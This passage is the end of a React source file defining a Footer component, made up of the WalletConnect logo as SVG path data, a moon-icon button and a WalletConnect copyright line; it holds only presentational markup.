C1353.79587,178.455611 1360.37293,187.225028 1370.96931,187.225028 C1379.51949,187.225028 1385.07346,182.109535 1386.38887,173.559354 L1406.26621,173.559354 C1405.17004,192.048207 1391.3582,203.959997 1370.75008,203.959997 C1347.14573,203.959997 1332.16464,188.613519 1332.16464,163.036055 C1332.16464,137.897061 1347.14573,122.258269 1370.60392,122.258269 C1391.79668,122.258269 1405.24311,135.339315 1406.19313,153.097383 Z M1422.2704,105.888692 L1443.60931,105.888692 L1443.60931,123.939074 L1458.07885,123.939074 L1458.07885,140.016337 L1443.60931,140.016337 L1443.60931,177.505591 C1443.60931,183.498026 1446.53245,186.348086 1452.8172,186.348086 C1454.71724,186.348086 1456.69036,186.201929 1458.00577,185.982694 L1458.00577,201.694565 C1455.81341,202.206114 1452.15949,202.571506 1447.84786,202.571506 C1429.43209,202.571506 1422.2704,196.432915 1422.2704,181.159515 L1422.2704,140.016337 L1411.23555,140.016337 L1411.23555,123.939074 L1422.2704,123.939074 L1422.2704,105.888692 Z"
                          id="WalletConnect"
                          fill="#3999FB"
                        ></path>
                        <path
                          d="M79.4992542,46.5389641 C142.715504,-15.3550143 245.209294,-15.3550143 308.425541,46.5389641 L316.033719,53.9880033 C319.194531,57.0827021 319.194531,62.1002006 316.033719,65.1949006 L290.007661,90.6765804 C288.427255,92.2239311 285.86491,92.2239311 284.284504,90.6765804 L273.814748,80.4258162 C229.713513,37.2470301 158.211283,37.2470301 114.110047,80.4258162 L102.897805,91.4035389 C101.317397,92.9508883 98.755052,92.9508883 97.1746471,91.4035389 L71.1485898,65.9218591 C67.9877774,62.8271591 67.9877774,57.8096606 71.1485898,54.7149619 L79.4992542,46.5389641 Z M362.249885,99.2377722 L385.413126,121.916595 C388.573922,125.01128 388.573941,130.028748 385.413167,133.123453 L280.968512,235.385079 C277.807722,238.479801 272.683033,238.479836 269.522198,235.385159 C269.522185,235.385146 269.52217,235.385132 269.522157,235.385118 L195.393696,162.807065 C194.603493,162.03339 193.32232,162.03339 192.532117,162.807065 C192.532112,162.80707 192.532108,162.807076 192.532103,162.807079 L118.40522,235.385079 C115.24444,238.479809 110.119749,238.479861 106.958905,235.385192 C106.958887,235.385174 106.958867,235.385155 106.958847,235.385136 L2.51128675,133.12215 C-0.649524409,130.027451 -0.649524409,125.009953 2.51128675,121.915254 L25.6745697,99.2364692 C28.8353808,96.1417705 33.9600712,96.1417705 37.1208837,99.2364692 L111.250424,171.815537 C112.040627,172.589212 113.321798,172.589212 114.112002,171.815537 C114.112014,171.815525 114.112024,171.815514 114.112036,171.815505 L188.237861,99.2364692 C191.398601,96.1416993 196.523291,96.1415832 199.684176,99.2362107 C199.68422,99.2362542 199.684263,99.2362977 199.684307,99.2363413 L273.813749,171.815505 C274.603952,172.589179 275.885125,172.589179 276.675327,171.815505 L350.803571,99.2377722 C353.964384,96.1430722 359.089073,96.1430722 362.249885,99.2377722 Z"
                          id="WalletConnect"
                          fill="#3B99FC"
                          fillRule="nonzero"
                        ></path>
                      </g>
                    </g>
                  </svg>
                </div>

                <ul className="chakra-stack css-ptrlcw">
                  <li className="css-144h0q4"></li>
                  <li className="css-144h0q4"></li>
                  <li className="css-144h0q4"></li>
                </ul>
              </div>
              <div
                className="chakra-stack css-84zodg"
                style={{ display: "flex", alignItems: "center" }}
              >
                <button type="button" className="chakra-button css-19hnesl">
                  <svg
                    stroke="currentColor"
                    fill="#A1ADBF"
                    strokeWidth="0"
                    viewBox="0 0 512 512"
                    aria-hidden="true"
                    focusable="false"
                    height="1em"
                    width="1em"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path d="M283.211 512c78.962 0 151.079-35.925 198.857-94.792 7.068-8.708-.639-21.43-11.562-19.35-124.203 23.654-238.262-71.576-238.262-196.954 0-72.222 38.662-138.635 101.498-174.394 9.686-5.512 7.25-20.197-3.756-22.23A258.156 258.156 0 0 0 283.211 0c-141.309 0-256 114.511-256 256 0 141.309 114.511 256 256 256z"></path>
                  </svg>
                </button>
                <p className="chakra-text css-0">© WalletConnect Inc</p>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
}

export default Footer;
